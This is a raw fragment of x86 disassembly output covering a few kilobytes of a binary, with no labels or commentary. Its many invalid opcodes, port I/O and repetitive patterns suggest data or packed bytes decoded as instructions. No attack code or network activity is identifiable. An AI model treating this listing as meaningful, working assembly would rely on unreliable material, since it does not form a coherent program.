  423405:	cmp    ecx,DWORD PTR [ebp-0x68b2f573]
  42340b:	scas   eax,DWORD PTR es:[edi]
  42340c:	xor    al,0x8b
  42340f:	adc    BYTE PTR [edi+0x5311538b],0x9c
  423416:	mov    dl,0xbe
  423418:	or     al,0xb2
  42341a:	clc    
  42341b:	sub    edi,edi
  42341d:	(bad)  
  42341e:	arpl   bp,di
  423420:	xlat   BYTE PTR ds:[ebx]
  423421:	mov    WORD PTR [edi+esi*2+0x3e],?
  423425:	cmp    cl,BYTE PTR [ebp+0x77808d8d]
  42342b:	stc    
  42342c:	xor    al,0xf9
  42342f:	push   ebx
  423430:	je     0x4233e4
  423432:	xchg   BYTE PTR [ebx+edx*2],cl
  423435:	sub    dh,BYTE PTR [edx-0x4d00d646]
  42343b:	in     al,dx
  42343c:	ja     0x4234a8
  42343e:	push   eax
  42343f:	ja     0x4234ab
  423441:	xor    BYTE PTR [edi+0x3e],0x4f
  423445:	push   0xffffffd5
  423447:	sbb    eax,0x80f97780
  42344c:	lock stc 
  42344e:	push   ebx
  42344f:	je     0x4234a4
  423451:	sub    dh,BYTE PTR [edx-0x454df37a]
  423457:	sub    edi,edi
  423459:	mov    dl,0xec
  42345b:	ja     0x4234d7
  42345d:	push   eax
  42345e:	ja     0x4234da
  423460:	xor    BYTE PTR [edi-0x7],0x80
  423464:	lock stc 
  423466:	push   ebx
  423467:	je     0x4234bc
  423469:	sub    dh,BYTE PTR [edx-0x794dd646]
  42346f:	or     al,0xff
  423471:	mov    dl,0x80
  423473:	lock test BYTE PTR [ebx-0x3],al
  423477:	xor    BYTE PTR [edi+0x6a],0x63
  42347b:	mov    dl,0x9
  42347d:	dec    esp
  42347e:	or     DWORD PTR ds:0xde24d4d,0x7a7780a9
  423488:	xor    al,0x6a
  42348b:	arpl   bp,di
  42348d:	xlat   BYTE PTR ds:[ebx]
  42348e:	push   cs
  42348f:	dec    ebp
  423490:	xlat   BYTE PTR ds:[ebx]
  423491:	out    dx,eax
  423492:	add    DWORD PTR [edi-0x76],esi
  423495:	or     al,BYTE PTR [esi-0x7272809a]
  42349b:	push   eax
  42349c:	ja     0x423514
  42349e:	les    ebx,FWORD PTR [ebx]
  4234a0:	xor    BYTE PTR [edi+0x76],0x80
  4234a4:	lock stc 
  4234a6:	adc    BYTE PTR [edi+0x531153f9],0x7e
  4234ad:	mov    dl,0xbe
  4234af:	or     al,0xb2
  4234b1:	clc    
  4234b2:	sub    edi,edi
  4234b4:	(bad)  
  4234b5:	outs   dx,BYTE PTR ds:[esi]
  4234b6:	out    dx,eax
  4234b7:	xor    BYTE PTR [edi-0x75],0x80
  4234bb:	lock mov edx,DWORD PTR [ebx+0x74]
  4234bf:	push   ebx
  4234c0:	push   ecx
  4234c1:	mov    dl,0xba
  4234c3:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4234c9:	xor    al,0x76
  4234cc:	arpl   WORD PTR [edx-0x33f0f7],si
  4234d2:	lea    ecx,[ebp-0x7f748880]
  4234d8:	lock mov edx,DWORD PTR [ebx+0x74]
  4234dc:	push   ebx
  4234dd:	push   ecx
  4234de:	mov    dl,0xba
  4234e0:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4234e6:	xor    al,0x8a
  4234e9:	arpl   WORD PTR [edx-0x7bf0f7],si
  4234ef:	lea    ecx,[ebp-0x7f748880]
  4234f5:	lock mov edx,DWORD PTR [ebx+0x74]
  4234f9:	push   ebx
  4234fa:	push   ecx
  4234fb:	mov    dl,0x86
  4234fd:	or     al,0xb2
  4234ff:	mov    edx,0xc4b2ff29
  423504:	adc    eax,0x80f9f080
  423509:	xchg   edi,eax
  42350a:	stc    
  42350b:	push   ebx
  42350c:	adc    DWORD PTR [ebx+0x7e],edx
  42350f:	mov    dl,0xbe
  423511:	or     al,0xb2
  423513:	clc    
  423514:	sub    edi,edi
  423516:	(bad)  
  423517:	in     al,dx
  423518:	mov    dl,0x80
  42351a:	lock mov ah,BYTE PTR [ebx-0x4e]
  42351e:	in     al,0xb8
  423520:	xor    BYTE PTR [edi-0x76],0x50
  423524:	ja     0x4234aa
  423526:	xor    BYTE PTR [edi+0x76],0x50
  42352a:	ja     0x42358e
  42352c:	ins    BYTE PTR es:[edi],dx
  42352d:	mul    BYTE PTR [edi+ebp*2]
  423530:	cmp    BYTE PTR [eax-0x19],dl
  423533:	inc    esi
  423534:	jl     0x4235ad
  423536:	xor    ch,0x24
  423539:	outs   dx,DWORD PTR ds:[esi]
  42353a:	cmp    BYTE PTR [eax-0xf7fb989],al
  423540:	inc    esi
  423541:	push   ebx
  423542:	je     0x423597
  423544:	push   ecx
  423545:	mov    dl,0x86
  423547:	or     al,0xb2
  423549:	mov    edx,0x50b2ff29
  42354e:	ja     0x4235a6
  423550:	xor    BYTE PTR [edi+0x46],0x80
  423554:	lock inc esi
  423556:	push   ebx
  423557:	je     0x4235ac
  423559:	push   ecx
  42355a:	mov    dl,0x86
  42355c:	or     al,0xb2
  42355e:	mov    edx,0x50b2ff29
  423563:	ja     0x4235df
  423565:	jl     0x4235de
  423567:	ds dec ecx
  423569:	and    al,0x6f
  42356b:	cmp    BYTE PTR [edi+esi*2+0x1e],bh
  42356f:	fisub  WORD PTR [edi+ebp*2]
  423572:	cmp    BYTE PTR [eax-0xf7fb989],al
  423578:	inc    esi
  423579:	push   ebx
  42357a:	je     0x4235cf
  42357c:	push   ecx
  42357d:	mov    dl,0xba
  42357f:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423585:	xor    al,0x84
  423588:	arpl   bp,di
  42358a:	or     DWORD PTR [edi],ecx
  42358c:	pop    ss
  42358d:	in     al,dx
  42358e:	lea    ecx,[ebp-0x72f35f42]
  423594:	lea    eax,[eax+0x77803ef0]
  42359a:	adc    BYTE PTR ds:[edi+0x53fc5356],0x11
  4235a2:	mov    dl,0x84
  4235a4:	sub    DWORD PTR [edx-0x200f342],esi
  4235aa:	xor    BYTE PTR [edi-0x7c],0x43
  4235ae:	sti    
  4235af:	push   ebx
  4235b0:	jb     0x4235fd
  4235b2:	add    eax,0x807a7750
  4235b7:	ja     0x4235d7
  4235b9:	xor    al,0x1e
  4235bc:	push   ebx
  4235bd:	je     0x423612
  4235bf:	push   ecx
  4235c0:	mov    dl,0xba
  4235c2:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4235c8:	xor    al,0x7a
  4235cb:	arpl   bp,di
  4235cd:	fst    DWORD PTR [edi]
  4235cf:	xor    BYTE PTR [edi+0x1e],0x80
  4235d3:	lock push ds
  4235d5:	push   ebx
  4235d6:	je     0x42362b
  4235d8:	push   ecx
  4235d9:	mov    dl,0x86
  4235db:	or     al,0xb2
  4235dd:	mov    edx,0x50b2ff29
  4235e2:	ja     0x42365e
  4235e4:	xor    BYTE PTR [edi+0x3e],0x80
  4235e8:	lock ds push ebx
  4235eb:	je     0x423640
  4235ed:	push   ecx
  4235ee:	mov    dl,0x86
  4235f0:	or     al,0xb2
  4235f2:	mov    edx,0x80b2ff29
  4235f7:	lock jp 0x423603
  4235fa:	and    dh,BYTE PTR [edx-0x7f8588b0]
  423600:	ja     0x423648
  423602:	xor    al,0x46
  423605:	push   ebx
  423606:	je     0x42365b
  423608:	push   ecx
  423609:	mov    dl,0xba
  42360b:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423611:	xor    al,0x7a
  423614:	arpl   bp,di
  423616:	or     DWORD PTR [edi],ecx
  423618:	(bad)  
  423619:	or     al,0x8d
  42361b:	lea    eax,[eax+0x77507a77]
  423621:	scas   eax,DWORD PTR es:[edi]
  423622:	xor    BYTE PTR [edi+0x56],0xec
  423626:	ja     0x42368a
  423628:	push   eax
  423629:	out    0x7a,eax
  42362b:	push   eax
  42362c:	ja     0x423698
  42362e:	pop    esi
  42362f:	cmc    
  423630:	and    al,0x6f
  423632:	cmp    BYTE PTR [eax+0x77],dl
  423635:	pop    esi
  423636:	jl     0x4236af
  423638:	push   ss
  423639:	hlt    
  42363a:	and    al,0x6f
  42363c:	cmp    BYTE PTR [edi+esi*2+0x36],bh
  423640:	repz and al,0x6f
  423643:	cmp    BYTE PTR [eax+0x77],dl
  423646:	test   DWORD PTR [eax-0xf7f8589],0x5374537a
  423650:	push   ecx
  423651:	mov    dl,0x86
  423653:	or     al,0xb2
  423655:	mov    edx,0x50b2ff29
  42365a:	ja     0x423659
  42365c:	sub    BYTE PTR [edx-0x42],0x4f
  423660:	cmp    cl,BYTE PTR [ebp+0x7c6a808d]
  423666:	dec    edi
  423667:	or     cl,BYTE PTR [ebp+0x4d]
  42366a:	dec    ebp
  42366b:	jmp    0x7c6a:0x80386f24
  423672:	dec    edi
  423673:	xchg   ebp,eax
  423674:	dec    ebp
  423675:	dec    ebp
  423676:	dec    ebp
  423677:	or     esp,DWORD PTR [edi+ebp*2]
  42367a:	cmp    BYTE PTR [eax-0x7f957f96],al
  423680:	ja     0x423679
  423682:	xor    al,0xf7
  423685:	push   ebx
  423686:	je     0x4236db
  423688:	push   ecx
  423689:	mov    dl,0x86
  42368b:	or     al,0xb2
  42368d:	mov    edx,0x80b2ff29
  423692:	lock std 
  423694:	or     DWORD PTR [edx],esp
  423696:	mov    dl,0x80
  423698:	lock push 0xffffff8f
  42369b:	out    dx,al
  42369c:	out    dx,eax
  42369d:	adc    BYTE PTR [edi+0x4],dh
  4236a0:	sub    BYTE PTR [edx-0x80],0x77
  4236a4:	test   DWORD PTR [eax+0x5153f7f0],0xbab27453
  4236ae:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4236b4:	xor    al,0xfd
  4236b7:	or     DWORD PTR [edx],esp
  4236b9:	mov    dl,0x80
  4236bb:	lock push ss
  4236bd:	adc    BYTE PTR [edi+0x53115316],0x7e
  4236c4:	mov    dl,0xbe
  4236c6:	or     al,0xb2
  4236c8:	clc    
  4236c9:	sub    edi,edi
  4236cb:	(bad)  
  4236cc:	in     al,dx
  4236cd:	mov    dl,0x80
  4236cf:	lock push 0x9
  4236d2:	loopne 0x4236f5
  4236d4:	out    dx,eax
  4236d5:	or     BYTE PTR [edi+0xa],0x4d
  4236d9:	dec    ebp
  4236da:	dec    ebp
  4236db:	sbb    BYTE PTR [eax],0xa
  4236de:	dec    ebp
  4236df:	dec    ebp
  4236e0:	dec    ebp
  4236e1:	push   ebx
  4236e2:	je     0x423737
  4236e4:	jle    0x423698
  4236e6:	xchg   BYTE PTR [edx+esi*4],cl
  4236e9:	clc    
  4236ea:	sub    edi,edi
  4236ec:	sti    
  4236ed:	in     al,dx
  4236ee:	mov    dl,0x9
  4236f0:	loopne 0x4236e2
  4236f2:	add    al,0x53
  4236f4:	std    
  4236f5:	adc    al,dh
  4236f7:	add    al,0x80
  4236f9:	push   0xffffff8f
  4236fb:	ja     0x423701
  4236fd:	xor    al,0xf7
  423700:	adc    BYTE PTR [edi+0x531153f7],0x7e
  423707:	mov    dl,0xf8
  423709:	sub    DWORD PTR [edx-0x100f342],esi
  42370f:	adc    BYTE PTR [edi-0x1ddf603],0x80
  423716:	xchg   edi,eax
  423717:	push   0x10
  423719:	out    dx,al
  42371a:	push   cs
  42371b:	sub    BYTE PTR [edx-0x80],0x77
  42371f:	test   DWORD PTR [eax+0x7453f7f0],0x86b25153
  423729:	or     al,0xb2
  42372b:	mov    edx,0x80b2ff29
  423730:	lock std 
  423732:	or     DWORD PTR [edx],esp
  423734:	mov    dl,0x80
  423736:	lock push 0xffffff8f
  423739:	out    dx,al
  42373a:	out    dx,eax
  42373b:	adc    BYTE PTR [edi+0x4],dh
  42373e:	sub    BYTE PTR [edx-0x80],0x77
  423742:	test   DWORD PTR [eax+0x7453f7f0],0x530c86b2
  42374c:	push   ecx
  42374d:	mov    dl,0xba
  42374f:	sub    edi,edi
  423751:	mov    dl,0x80
  423753:	lock std 
  423755:	or     DWORD PTR [edx],esp
  423757:	mov    dl,0x80
  423759:	lock pop esi
  42375b:	adc    BYTE PTR [edi+0x5311535e],0x7e
  423762:	mov    dl,0xbe
  423764:	or     al,0xb2
  423766:	clc    
  423767:	sub    edi,edi
  423769:	(bad)  
  42376a:	in     al,dx
  42376b:	mov    dl,0x80
  42376d:	lock push 0x9
  423770:	loopne 0x423793
  423772:	out    dx,eax
  423773:	or     BYTE PTR [edi-0x6b],0x4d
  423777:	dec    ebp
  423778:	dec    ebp
  423779:	sbb    BYTE PTR [eax],0x95
  42377c:	dec    ebp
  42377d:	dec    ebp
  42377e:	dec    ebp
  42377f:	push   ebx
  423780:	je     0x4237d5
  423782:	jle    0x423736
  423784:	xchg   BYTE PTR [edx+esi*4],cl
  423787:	clc    
  423788:	sub    edi,edi
  42378a:	sti    
  42378b:	in     al,dx
  42378c:	mov    dl,0x9
  42378e:	loopne 0x423780
  423790:	add    al,0x53
  423792:	std    
  423793:	adc    al,dh
  423795:	add    al,0x80
  423797:	push   0xffffff8f
  423799:	ja     0x42379f
  42379b:	xor    al,0xf7
  42379e:	adc    BYTE PTR [edi+0x531153f7],0x7e
  4237a5:	mov    dl,0xf8
  4237a7:	sub    DWORD PTR [edx-0x100f342],esi
  4237ad:	adc    BYTE PTR [edi-0x1ddf603],0x80
  4237b4:	xchg   edi,eax
  4237b5:	push   0x10
  4237b7:	out    dx,al
  4237b8:	push   cs
  4237b9:	sub    BYTE PTR [edx-0x80],0x77
  4237bd:	ss xor al,0x36
  4237c1:	push   ebx
  4237c2:	push   ecx
  4237c3:	push   ebx
  4237c4:	je     0x423778
  4237c6:	mov    edx,0xc86b229
  4237cb:	push   DWORD PTR [edx-0x7fa10f80]
  4237d1:	xchg   edi,eax
  4237d2:	pop    esi
  4237d3:	push   ebx
  4237d4:	adc    DWORD PTR [ebx+0x7e],edx
  4237d7:	mov    dl,0xbe
  4237d9:	or     al,0xb2
  4237db:	clc    
  4237dc:	sub    edi,edi
  4237de:	dec    BYTE PTR [ecx]
  4237e0:	and    dh,BYTE PTR [edx+0x50fd77ec]
  4237e6:	ja     0x4237e5
  4237e8:	xor    BYTE PTR [edi-0x3],0x80
  4237ec:	lock scas eax,DWORD PTR es:[edi]
  4237ee:	arpl   bp,di
  4237f0:	or     edx,ebp
  4237f2:	(bad)  
  4237f3:	or     eax,0x77804d4d
  4237f8:	pop    esi
  4237f9:	xor    al,0x5e
  4237fc:	push   ebx
  4237fd:	push   ecx
  4237fe:	mov    dl,0xba
  423800:	sub    DWORD PTR [ebx+0x74],edx
  423803:	mov    dl,0x86
  423805:	or     al,0xff
  423807:	mov    dl,0x80
  423809:	lock scas eax,DWORD PTR es:[edi]
  42380b:	or     DWORD PTR [edx],esp
  42380d:	mov    dl,0x80
  42380f:	lock jp 0x423865
  423812:	adc    DWORD PTR [edx-0x4d00f342],esi
  423818:	xor    al,0x7a
  42381b:	push   ebx
  42381c:	push   ecx
  42381d:	mov    dl,0xba
  42381f:	sub    edi,edi
  423821:	mov    dl,0x50
  423823:	ja     0x42385b
  423825:	xor    BYTE PTR [edi-0x7e],0x80
  423829:	lock adc BYTE PTR [ebx+0x51],0xb2
  42382e:	mov    edx,0xb2745329
  423833:	xchg   BYTE PTR [edi+edi*8],cl
  423836:	mov    dl,0x80
  423838:	lock add BYTE PTR [eax+0x11538297],0xb2
  423840:	mov    esi,0xb27e530c
  423845:	clc    
  423846:	sub    edi,edi
  423848:	(bad)  
  423849:	in     al,dx
  42384a:	lock ss in al,dx
  42384d:	std    
  42384e:	in     al,dx
  42384f:	lock push esi
  423851:	push   eax
  423852:	lock push esi
  423854:	les    ebx,FWORD PTR ds:0x80827780
  42385a:	lock adc BYTE PTR [ebx+0x74],0x53
  42385f:	push   ecx
  423860:	mov    dl,0x86
  423862:	or     al,0xb2
  423864:	mov    edx,0xecb2ff29
  423869:	ja     0x4238c1
  42386b:	push   eax
  42386c:	ja     0x4238c4
  42386e:	xor    BYTE PTR [edi-0x7e],0x80
  423872:	lock adc BYTE PTR [ebx+0x74],0xb2
  423877:	xchg   BYTE PTR [ebx+edx*2],cl
  42387a:	push   ecx
  42387b:	mov    dl,0xba
  42387d:	sub    edi,edi
  42387f:	mov    dl,0x80
  423881:	lock test BYTE PTR [ebx-0x3],al
  423885:	xor    BYTE PTR [edi-0x7e],0x80
  423889:	xchg   edi,eax
  42388a:	adc    BYTE PTR [ebx+0x74],0x53
  42388e:	jle    0x423842
  423890:	clc    
  423891:	sub    DWORD PTR [edx-0x400f37a],esi
  423897:	adc    BYTE PTR [edi-0x4ddf6aa],0x63
  42389e:	mov    dl,0x9
  4238a0:	dec    esp
  4238a1:	xor    cl,BYTE PTR [edx+0x77804d4d]
  4238a7:	mov    eax,DWORD PTR [eax+0x77808b77]
  4238ad:	mov    dl,BYTE PTR [eax+0x77]
  4238b0:	xor    BYTE PTR ss:[edi-0x11],0x80
  4238b5:	lock adc BYTE PTR es:[edi-0x4deeacda],0xbe
  4238be:	or     al,0x53
  4238c0:	jle    0x423842
  4238c2:	int    0x32
  4238c4:	cmp    cl,BYTE PTR [ebp+0x29f8b28d]
  4238ca:	(bad)  
  4238cb:	(bad)  
  4238cc:	xchg   esi,eax
  4238cd:	xor    al,0x66
  4238d0:	adc    BYTE PTR [edi+0x53115366],0x7e
  4238d7:	mov    dl,0xbe
  4238d9:	or     al,0xb2
  4238db:	clc    
  4238dc:	sub    edi,edi
  4238de:	(bad)  
  4238df:	xchg   esi,eax
  4238e0:	xor    al,0x8b
  4238e3:	adc    BYTE PTR [edi+0x36d74d8b],0x53
  4238ea:	adc    DWORD PTR [ebx+0x7e],edx
  4238ed:	mov    dl,0xbe
  4238ef:	or     al,0xb2
  4238f1:	clc    
  4238f2:	sub    edi,edi
  4238f4:	(bad)  
  4238f5:	xchg   esi,eax
  4238f6:	dec    ebp
  4238f7:	or     dl,BYTE PTR ds:0x808bf080
  4238fd:	xchg   edi,eax
  4238fe:	mov    edx,DWORD PTR [ebx+0x11]
  423901:	push   ebx
  423902:	jle    0x4238b6
  423904:	mov    esi,0x29f8b20c
  423909:	(bad)  
  42390a:	(bad)  
  42390b:	push   eax
  42390c:	ja     0x423974
  42390e:	arpl   bp,di
  423910:	or     DWORD PTR [edi],ecx
  423912:	cmp    al,0x8d
  423914:	lea    ecx,[ebp-0x3b748880]
  42391a:	lock adc BYTE PTR [edi-0x7b88af9a],0x6e
  423922:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423923:	test   BYTE PTR [eax-0x414d7b10],al
  423929:	or     al,0x53
  42392b:	cld    
  42392c:	mov    dl,0x84
  42392e:	sub    edi,edi
  423930:	mov    dl,0x80
  423932:	lock jbe 0x4238c4
  423935:	and    DWORD PTR [edx],edi
  423937:	adc    BYTE PTR [ecx],ah
  423939:	jno    0x4238bb
  42393b:	lock stc 
  42393d:	xor    al,0xf9
  423940:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423947:	mov    dl,0xf8
  423949:	sub    DWORD PTR [edx-0x100f342],esi
  42394f:	adc    BYTE PTR [edi-0x7f021307],0x77
  423956:	test   BYTE PTR [ebx-0x6c],dl
  423959:	in     eax,dx
  42395a:	test   BYTE PTR [edx-0x4d750713],cl
  423960:	mov    esi,0xfffbec29
  423965:	mov    dl,0x53
  423967:	jl     0x4238e9
  423969:	lock mov al,BYTE PTR [eax-0x74d7569]
  423970:	or     al,0xb2
  423972:	mov    esi,0x53b6ff29
  423977:	pushf  
  423978:	arpl   bx,di
  42397a:	xlat   BYTE PTR ds:[ebx]
  42397b:	sub    al,0x80
  42397d:	ja     0x42396e
  42397f:	xor    al,0x2e
  423982:	adc    BYTE PTR [edi+0x32cd802e],0x3a
  423989:	lea    ecx,[ebp+0x7e531153]
  42398f:	mov    dl,0xbe
  423991:	or     al,0xb2
  423993:	clc    
  423994:	sub    edi,edi
  423996:	(bad)  
  423997:	xchg   esi,eax
  423998:	xor    al,0x8b
  42399b:	adc    BYTE PTR [edi+0x5311538b],0x7e
  4239a2:	mov    dl,0xbe
  4239a4:	or     al,0xb2
  4239a6:	clc    
  4239a7:	sub    edi,edi
  4239a9:	(bad)  
  4239aa:	xchg   esi,eax
  4239ab:	dec    ebp
  4239ac:	xlat   BYTE PTR ds:[ebx]
  4239ad:	jbe    0x4239fc
  4239af:	or     bl,BYTE PTR ds:0x50667780
  4239b5:	ja     0x423a2d
  4239b7:	xor    BYTE PTR [edi+0x36],0x50
  4239bb:	ja     0x423947
  4239bd:	xor    BYTE PTR [edi-0x76],0x53
  4239c1:	jo     0x4239b0
  4239c3:	xchg   dh,ch
  4239c5:	aad    0x43
  4239c7:	xor    BYTE PTR [edi+0x76],0x80
  4239cb:	adc    eax,0x767780ef
  4239d0:	sub    dh,0xef
  4239d3:	push   ebx
  4239d4:	cld    
  4239d5:	push   ebx
  4239d6:	xchg   esp,eax
  4239d7:	mov    dl,0x84
  4239d9:	sub    DWORD PTR [edx-0x400f3f9],esi
  4239df:	adc    BYTE PTR [edi-0x5911af8a],0x80
  4239e6:	ja     0x423972
  4239e8:	in     eax,dx
  4239e9:	mov    dl,0xee
  4239eb:	in     eax,dx
  4239ec:	xchg   dh,ch
  4239ee:	arpl   bp,di
  4239f0:	in     al,0x98
  4239f2:	xor    BYTE PTR [edi-0x76],0x53
  4239f6:	jo     0x4239e5
  4239f8:	xchg   dh,ch
  4239fa:	aad    0x43
  4239fc:	xor    BYTE PTR [edi+0x76],0x80
  423a00:	adc    eax,0x767780ef
  423a05:	sub    dh,0xef
  423a08:	push   ebx
  423a09:	cld    
  423a0a:	push   ebx
  423a0b:	xchg   esp,eax
  423a0c:	mov    dl,0x84
  423a0e:	sub    DWORD PTR [edx-0x400f3f9],esi
  423a14:	adc    BYTE PTR [edi-0x5911af8a],0x80
  423a1b:	ja     0x4239a7
  423a1d:	in     eax,dx
  423a1e:	mov    dl,0xee
  423a20:	in     eax,dx
  423a21:	xchg   dh,ch
  423a23:	arpl   bp,di
  423a25:	in     al,0x98
  423a27:	xor    BYTE PTR [edi+0x76],0x80
  423a2b:	lock stc 
  423a2d:	push   eax
  423a2e:	ja     0x4239df
  423a30:	xor    BYTE PTR [edi-0x7],0x53
  423a34:	adc    DWORD PTR [ebx-0x4],edx
  423a37:	mov    dl,0x84
  423a39:	sub    DWORD PTR [edx-0x200f342],esi
  423a3f:	xor    BYTE PTR [edi-0x75],0x50
  423a43:	lock es jl 0x423abe
  423a47:	inc    ecx
  423a48:	ins    DWORD PTR es:[edi],dx
  423a49:	pop    ebp
  423a4a:	ins    DWORD PTR es:[edi],dx
  423a4b:	aas    
  423a4c:	jl     0x423ac5
  423a4e:	pop    edx
  423a4f:	ins    DWORD PTR es:[edi],dx
  423a50:	inc    ebx
  423a51:	ins    DWORD PTR es:[edi],dx
  423a52:	push   ebx
  423a53:	push   eax
  423a54:	ja     0x423abc
  423a56:	fsub   QWORD PTR [si]
  423a59:	outs   dx,DWORD PTR ds:[esi]
  423a5a:	cmp    BYTE PTR [ecx],cl
  423a5c:	jg     0x80cfc7ef
  423a62:	xchg   edi,eax
  423a63:	scas   eax,DWORD PTR es:[edi]
  423a64:	cmp    ch,0x53
  423a67:	adc    DWORD PTR [eax-0x10],edx
  423a6a:	test   BYTE PTR [edx+0x530c84c7],dh
  423a70:	cld    
  423a71:	mov    dl,0x84
  423a73:	sub    edi,edi
  423a75:	ja     0x4239fb
  423a77:	push   eax
  423a78:	lock bound ecx,QWORD PTR [edi+0x9412f31]
  423a7f:	cli    
  423a80:	out    dx,al
  423a81:	jno    0x423a50
  423a83:	add    eax,0xbdbecdcd
  423a88:	or     eax,esp
  423a8a:	jo     0x423aef
  423a8c:	mov    dl,0xd7
  423a8e:	fiadd  DWORD PTR [eax-0xf7f0689]
  423a94:	stc    
  423a95:	xor    BYTE PTR [edi-0x7],0x80
  423a99:	xchg   edi,eax
  423a9a:	stc    
  423a9b:	push   ebx
  423a9c:	cld    
  423a9d:	push   ebx
  423a9e:	adc    DWORD PTR [edx-0x414dd67c],esi
  423aa4:	or     al,0xff
  423aa6:	std    
  423aa7:	xor    BYTE PTR [edi+0x66],0x53
  423aab:	cld    
  423aac:	mov    dl,0x84
  423aae:	sub    edi,edi
  423ab0:	ja     0x423a36
  423ab2:	push   ebx
  423ab3:	xchg   esp,eax
  423ab4:	in     al,dx
  423ab5:	std    
  423ab6:	xor    BYTE PTR [edi+0x62],0xed
  423aba:	test   BYTE PTR [edx-0x4d750713],cl
  423ac0:	mov    esi,0xfff7ec29
  423ac5:	(bad)  
  423ac6:	push   ebx
  423ac7:	sub    al,BYTE PTR [eax+0x66f050b2]
  423acd:	fsub   QWORD PTR [si]
  423ad0:	outs   dx,DWORD PTR ds:[esi]
  423ad1:	cmp    bh,dl
  423ad3:	add    DWORD PTR [eax-0x6f3bd910],eax
  423ad9:	xor    al,0x8b
  423adc:	xor    BYTE PTR [edi-0x75],0x53
  423ae0:	adc    DWORD PTR [ebx-0x4],edx
  423ae3:	mov    dl,0xbe
  423ae5:	or     al,0xb2
  423ae7:	test   BYTE PTR [ecx],ch
  423ae9:	(bad)  
  423aea:	std    
  423aeb:	xor    BYTE PTR [edi-0x75],0x80
  423aef:	xchg   edi,eax
  423af0:	mov    edx,DWORD PTR [ebx+0x74]
  423af3:	push   ebx
  423af4:	jle    0x423aa8
  423af6:	xchg   BYTE PTR [edx+esi*4],cl
  423af9:	clc    
  423afa:	sub    edi,edi
  423afc:	sti    
  423afd:	arpl   WORD PTR [edx+0xc230f09],si
  423b03:	lea    ecx,[ebp-0x7f508880]
  423b09:	ins    DWORD PTR es:[edi],dx
  423b0a:	out    dx,eax
  423b0b:	push   eax
  423b0c:	out    0xf9,eax
  423b0e:	jl     0x423b87
  423b10:	es repz and al,0x6f
  423b14:	cmp    BYTE PTR [edi+esi*2+0x36],bh
  423b18:	hlt    
  423b19:	and    al,0x6f
  423b1b:	cmp    BYTE PTR [edi+esi*2+0x7a],bh
  423b1f:	mul    BYTE PTR [ebx+0x777c386f]
  423b25:	test   dl,bh
  423b27:	and    al,0x6f
  423b29:	cmp    BYTE PTR [edi+esi*2+0x66],bh
  423b2d:	nop
  423b2e:	shr    BYTE PTR [edi+0x38],1
  423b31:	push   eax
  423b32:	ja     0x423b72
  423b34:	xor    BYTE PTR [edi-0x11],0x80
  423b38:	lock test BYTE PTR [eax+0x11538497],al
  423b3f:	mov    dl,0xbe
  423b41:	or     al,0x53
  423b43:	jle    0x423af7
  423b45:	clc    
  423b46:	sub    edi,edi
  423b48:	(bad)  
  423b49:	xchg   esi,eax
  423b4a:	xor    al,0x7a
  423b4d:	adc    BYTE PTR [edi-0x4deeac86],0xbe
  423b54:	or     al,0x53
  423b56:	jle    0x423ad8
  423b58:	int    0x32
  423b5a:	cmp    cl,BYTE PTR [ebp+0x29f8b28d]
  423b60:	(bad)  
  423b61:	(bad)  
  423b62:	xchg   esi,eax
  423b63:	xor    al,0x66
  423b66:	adc    BYTE PTR [edi+0x53115366],0x7e
  423b6d:	mov    dl,0xbe
  423b6f:	or     al,0xb2
  423b71:	clc    
  423b72:	sub    edi,edi
  423b74:	(bad)  
  423b75:	xchg   esi,eax
  423b76:	xor    al,0xf9
  423b79:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423b80:	mov    dl,0xbe
  423b82:	or     al,0xb2
  423b84:	clc    
  423b85:	sub    edi,edi
  423b87:	(bad)  
  423b88:	xchg   esi,eax
  423b89:	dec    ebp
  423b8a:	or     dl,BYTE PTR ds:0x80667750
  423b90:	ja     0x423b81
  423b92:	xor    al,0x84
  423b95:	adc    BYTE PTR [edi-0x4deeac7c],0xbe
  423b9c:	or     al,0x53
  423b9e:	jle    0x423b20
  423ba0:	int    0x32
  423ba2:	cmp    cl,BYTE PTR [ebp+0x29f8b28d]
  423ba8:	(bad)  
  423ba9:	(bad)  
  423baa:	xchg   esi,eax
  423bab:	xor    al,0x7a
  423bae:	adc    BYTE PTR [edi+0x5311537a],0x7e
  423bb5:	mov    dl,0xbe
  423bb7:	or     al,0xb2
  423bb9:	clc    
  423bba:	sub    edi,edi
  423bbc:	(bad)  
  423bbd:	xchg   esi,eax
  423bbe:	xor    al,0xf9
  423bc1:	adc    BYTE PTR [edi+0x3ed74df9],0x53
  423bc8:	adc    DWORD PTR [ebx+0x7e],edx
  423bcb:	mov    dl,0xbe
  423bcd:	or     al,0xb2
  423bcf:	clc    
  423bd0:	sub    edi,edi
  423bd2:	(bad)  
  423bd3:	xchg   esi,eax
  423bd4:	dec    ebp
  423bd5:	or     dl,BYTE PTR ds:0x50f9f080
  423bdb:	ja     0x423b61
  423bdd:	xor    BYTE PTR [edi-0x7],0x53
  423be1:	adc    DWORD PTR [ebx-0x4],edx
  423be4:	mov    dl,0xbe
  423be6:	or     al,0xb2
  423be8:	test   BYTE PTR [ecx],ch
  423bea:	(bad)  
  423beb:	std    
  423bec:	xor    BYTE PTR [edi+0x66],0x63
  423bf0:	std    
  423bf1:	or     DWORD PTR [edi],ecx
  423bf3:	cmp    eax,0x808d8d2f
  423bf8:	lock stc 
  423bfa:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423c01:	mov    dl,0xbe
  423c03:	or     al,0xb2
  423c05:	clc    
  423c06:	sub    edi,edi
  423c08:	(bad)  
  423c09:	arpl   ax,si
  423c0b:	test   BYTE PTR [ecx],cl
  423c0d:	bswap  edi
  423c0f:	das    
  423c10:	lea    ecx,[ebp-0x7fd90f80]
  423c16:	lock es mov dl,0xbe
  423c1a:	or     al,0xcd
  423c1c:	add    eax,0x80ef10c4
  423c21:	lock stc 
  423c23:	xor    al,0xf9
  423c26:	mov    dl,0xbe
  423c28:	or     al,0xcd
  423c2a:	add    eax,0x3a7d10c4
  423c2f:	xor    al,0x36
  423c32:	xor    al,0x36
  423c35:	mov    dl,0xbe
  423c37:	or     al,0xcd
  423c39:	add    eax,0xc7d10c4
